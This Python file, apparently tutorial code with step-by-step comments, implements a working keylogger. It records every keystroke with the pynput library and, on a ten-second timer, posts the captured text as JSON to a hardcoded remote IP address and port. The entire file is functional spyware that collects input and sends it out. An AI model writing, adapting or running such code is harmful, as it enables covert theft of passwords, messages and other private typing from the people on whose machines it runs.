# Install pynput using the following command: pip install pynput
# Import the mouse and keynboard from pynput
# To transform a Dictionary to a JSON string we need the json package.
import json

#  The Timer module is part of the threading package.
import threading

# We need to import the requests library to Post the data to the server.
import requests
from pynput import keyboard

# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
text = ""

# Hard code the values of your server and ip address here.
ip_address = "109.74.200.23"
port_number = "8080"
# Time interval in seconds for code to execute.
time_interval = 10


def send_post_req():
    try:
        # We need to convert the Python object into a JSON string. So that we can POST it to the server. Which will look for JSON using
        # the format {"keyboardData" : "<value_of_text>"}
        payload = json.dumps({"keyboardData": text})
        # We send the POST Request to the server with ip address which listens on the port as specified in the Express server code.
        # Because we're sending JSON to the server, we specify that the MIME Type for JSON is application/json.
        requests.post(f"http://{ip_address}:{port_number}",
                          data=payload, headers={"Content-Type": "application/json"})
        # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
        timer = threading.Timer(time_interval, send_post_req)
        # We start the timer thread.
        timer.start()
    except Exception:
        print("Couldn't complete request!")

# We only need to log the key once it is released. That way it takes the modifier keys into consideration.


def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
        pass
    elif key == keyboard.Key.esc:
        return None
    else:
        text += str(key).strip("'")
    return None


# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function we specified how to deal with the different inputs received by the listener.
with keyboard.Listener(
        on_press=on_press) as listener:
    # We start of by sending the post request to our server.
    send_post_req()
    listener.join()
